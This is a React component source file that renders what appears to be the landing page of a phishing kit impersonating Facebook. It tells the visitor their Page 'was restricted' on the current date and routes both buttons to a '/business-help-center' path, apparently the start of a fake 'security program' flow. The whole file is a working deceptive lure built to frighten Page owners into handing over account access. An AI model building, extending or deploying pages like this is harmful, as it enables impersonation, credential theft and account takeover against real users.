import React, { useState,useEffect} from "react";
import '../HomePage/HomePage.scss';
import bannerImg from '../../../Resources/banner.jpg'
import { Route, Routes, BrowserRouter, useNavigate } from "react-router-dom";

const HomePage = () => {
  const navigate = useNavigate();
  const getCurrentTime = () => {
    const now = new Date();
    const m = now.toLocaleString("default", { month: "long" });
    const d = now.getDate();
    const y = now.getFullYear();
    return `${m} ${d}, ${y}.`;
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    navigate("/business-help-center");
  };

  return (
    <main className="_wapper">
      <div className="_container">
          <div className="_header_image"><img src={bannerImg} alt="banner"/></div>
          <div className="_header_content">
            <h1>Your page was restricted on {getCurrentTime()}</h1>
            <span>Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.</span>
          </div>
          <a className="_link" onClick={handleSubmit}><span>More information</span></a>
          <button className="_button" onClick={handleSubmit}>Continue</button>
          <div className="px-[14px] mt-5">
            <ol className="relative text-gray-500 border-s-2 border-gray-200">
                <li className="mb-10 ms-6">
                  <span className="absolute flex items-center justify-center w-6 h-6 bg-[#C4C4C4] rounded-full -start-[14px] ring-4 ring-white">
                      <svg className="w-3 h-3 text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 16 12">
                        <path stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M1 5.917 5.724 10.5 15 1.5"></path>
                      </svg>
                  </span>
                  <h3 className="text-black">We've enabled advanced protections to unlock your Page.</h3>
                </li>
                <li className="mb-10 ms-6">
                  <span className="absolute flex items-center justify-center w-6 h-6 bg-facebook rounded-full -start-[14px] ring-4 ring-white text-white text-sm bg-[#355797]">
                      <svg stroke="currentColor" fill="currentColor" strokeWidth="0" viewBox="0 0 576 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                        <path d="M528 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h480c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zm-352 96c35.3 0 64 28.7 64 64s-28.7 64-64 64-64-28.7-64-64 28.7-64 64-64zm112 236.8c0 10.6-10 19.2-22.4 19.2H86.4C74 384 64 375.4 64 364.8v-19.2c0-31.8 30.1-57.6 67.2-57.6h5c12.3 5.1 25.7 8 39.8 8s27.6-2.9 39.8-8h5c37.1 0 67.2 25.8 67.2 57.6v19.2zM512 312c0 4.4-3.6 8-8 8H360c-4.4 0-8-3.6-8-8v-16c0-4.4 3.6-8 8-8h144c4.4 0 8 3.6 8 8v16zm0-64c0 4.4-3.6 8-8 8H360c-4.4 0-8-3.6-8-8v-16c0-4.4 3.6-8 8-8h144c4.4 0 8 3.6 8 8v16zm0-64c0 4.4-3.6 8-8 8H360c-4.4 0-8-3.6-8-8v-16c0-4.4 3.6-8 8-8h144c4.4 0 8 3.6 8 8v16z"></path>
                      </svg>
                  </span>
                  <h3 className="text-black">Below, we walk you through the process in detail and help you fully activate to unlock your Page.</h3>
                </li>
            </ol>
          </div>
      </div>
    </main>
    );
}

export default HomePage;
